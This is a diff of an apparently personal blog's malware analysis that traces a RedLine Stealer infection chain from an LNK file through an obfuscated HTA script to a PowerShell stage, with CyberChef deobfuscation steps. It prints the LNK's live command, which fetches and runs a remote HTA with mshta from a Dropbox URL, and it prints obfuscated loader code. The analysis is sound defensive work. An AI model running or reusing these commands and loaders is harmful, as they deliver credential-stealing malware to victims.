@@ -8,16 +8,18 @@ The result is a RedLine Stealer binary, commonly sold on underground forums. The
 
 ## LNK File
 
-The initial payload is an LNK file, the easier way to review an LNK file is to view the target path, which in this case, shows the following:
+The initial payload is an LNK file, the easiest way to review an LNK file is to view the target path:
 ```powershell
 C:\Windows\System32\forfiles.exe /p C:\Windows\Vss /c "powershell start mshta https://dl.dropboxusercontent.com/scl/fi/aur0asu195akuhc7q88lq/mlwr?rlkey=ltpi9kve7882q0vksvvb54han
 ```
 
-A file is being downloaded and executed against mshta, meaning the payload is likely a HTA file (Microsoft HTML Application)
+When the LNK file is executed, a file is being downloaded from 'hxxps[://]dl.dropboxusercontent[.]com/scl/fi/aur0asu195akuhc7q88lq/mlwr?rlkey=ltpi9kve7882q0vksvvb54han' and executed against mshta, meaning the payload is very likely a HTA file (Microsoft HTML Application)
 
 ## HTA File
 
-The [file](https://www.virustotal.com/gui/file/302ec5af12ccc15b5771b3ed2b951ddc708f757c2103a1d6e71790f03902025e/detection) seems to contain a lot of junk characters at the start, it then has script tags which mshta will read and execute, followed by an MZ header for the legitimate calc.exe binary, likely added as a defence evasion technique.
+The [payload](https://www.virustotal.com/gui/file/302ec5af12ccc15b5771b3ed2b951ddc708f757c2103a1d6e71790f03902025e/detection) seems to contain a lot of junk characters at the start, it then has script tags which mshta will read and execute, followed by an MZ Header, indicating a portable executable.
+
+The junk characters seem meaningless, and the PE is the legitimate binary of calc.exe, this was likely added as a defence evasion technique.
 
 **Initial Bytes:**
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8ca5c1b5-4e02-4e0c-b10b-1e03e7e3cd30)
@@ -28,7 +30,7 @@ The [file](https://www.virustotal.com/gui/file/302ec5af12ccc15b5771b3ed2b951ddc7
 **Calc.exe:**
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/cf3d20df-09f8-4a2e-8f98-89e853a91621)
 
-We're only interesting in the HTA portion of the script, which is the following:
+We're only interested in the HTA portion of the script, as that's what will be executed, which is the following:
 
 ```powershell
 PZ=102;Qo=117;Bp=110;YI=99;hA=116;TV=105;Tm=111;KY=32;Hl=79;zU=108;Ty=67;uE=40;OV=69;yb=83;Nt=41;OA=123;no=118;rf=97;ap=114;iN=109;Df=81;hx=61;XX=34;Nc=59;Xs=85;yc=112;uB=77;HQ=48;eL=60;af=46;rx=101;un=103;lT=104;ie=43;uf=65;yS=120;Cl=78;Qn=100;Rx=91;hq=93;IV=45;DV=52;vm=51;Gm=125;hb=55;AO=53;PD=44;VG=56;kt=54;LE=50;p
@@ -52,9 +54,9 @@ PD,AO,AO,DV,PD,AO,is,kt,PD,AO,is,VG,PD,AO,DV,AO,PD,AO,DV,hb,PD,DV,VG,DV,PD,AO,HQ
 ```
 
 The script initially declares some 2 character variable names, which are likely bytes, and then executes them.
-We can save these variables locally by appending a $ before them, echo all of the variable names, and save the output to a file locally.
+We can save these variables locally by appending a $ before them, echo all of the variable names, and saving the output to a file locally.
 
-Multiple ways to go about this, I added all of the variables in PowerShell:
+There are multiple ways to go about this, and probably better ways, but I added all of the variables in PowerShell:
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e799fe6a-a876-46ff-9f68-fa09b25dd67f)
 
@@ -70,7 +72,7 @@ This leaves us with a byte array which we can convert from decimal in CyberChef:
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/3baf812c-cf5f-4ee7-9582-b223e820cfa7)
 
-Output:
+This is the output:
 
 ```powershell
 function OlC(OES){var mvQ= "";for (var UpM = 0; UpM < OES.length; UpM++) {var AxN = String.fromCharCode(OESeUpM0 - 443);mvQ = mvQ + AxN}return mvQ};var Srv = OlC(e475,488,562,475,492,475,488,544,555,475,528,553,557,544,558,559,557,548,542,559,544,543,475,488,553,554,555,475,475,479,563,525,553,557,559,551,475,504,475,482,508,508,508,508,508,508,508,508,508,508,508,508,508,508,508,508,508,508,508,508,508,511,491,508,545,496,550,552,548,530,493,515,553,563,492,544,557,559,497,533,548,515,550,542,557,510,514,496,563,525,562,496,546,486,525,531,550,561,549,526,561,546,540,528,541,550,486,558,557,541,529,557,522,558,524,546,553,499,559,554,522,486,547,560,491,524,562,492,518,524,549,498,513,508,550,496,563,520,554,556,545,544,519,517,549,520,512,544,540,552,551,530,557,513,494,513,527,524,497,548,553,497,513,511,520,528,491,544,558,530,558,495,492,563,500,492,557,517,490,561,550,557,517,524,522,550,515,528,520,520,493,520,552,519,511,491,494,553,486,551,509,557,562,493,532,544,516,542,516,521,522,556,561,560,495,514,516,529,523,549,543,486,513,548,558,490,524,555,528,530,496,513,549,499,548,521,510,511,524,564,498,541,527,544,541,490,542,551,492,518,491,518,510,492,554,542,556,508,551,561,549,499,494,548,518,551,552,560,561,543,565,563,523,560,552,497,542,516,524,563,519,559,486,493,532,519,547,497,545,552,508,524,554,542,528,512,527,548,486,555,524,562,493,500,495,490,509,557,542,530,515,548,523,541,510,519,524,494
@@ -82,7 +84,7 @@ function OlC(OES){var mvQ= "";for (var UpM = 0; UpM < OES.length; UpM++) {var Ax
 ```
 ## PowerShell Stage
 
-This script is essentially executing a byte array with PowerShell, but the values of the byte array are being manipulated first, each byte has the value 443 subtracted from it before execution.
+This script is essentially executing a byte array with PowerShell, but the values of the byte array are being manipulated first. Each decimal has the value 443 subtracted from it before execution.
 
 We can tackle this by taking the byte array in CyberChef and using the following operators:
 
@@ -90,13 +92,11 @@ We can tackle this by taking the byte array in CyberChef and using the following
 
 We first create a Fork with a comma delimiter, this will apply all future operations separately where a comma divides the decimals.
 
-We then add a find / replace operator, we replace each value with itself and 443
+We then add a find / replace operator, we replace each value with itself and 443 (for some reason, this creates two 443 values after each decimal, but rather than figuring out why, I just find / replace the two values with one.)
 
-For some reason, this creates two 443 values after each decimal, but rather than figuring out why, I just find / replace the two values with one.
+Add a subtract operator with a space delimiter, to take 443 away from the decimals.
 
-Then, add a subtract operator with a space delimiter.
-
-Convert the decimals from decimals, merge, and remove whitespace, to reveal the following:
+Finally, convert the decimals from decimal, merge, and remove whitespace to reveal the following:
 
 ```powershell
 -w1-epUnrestricted-
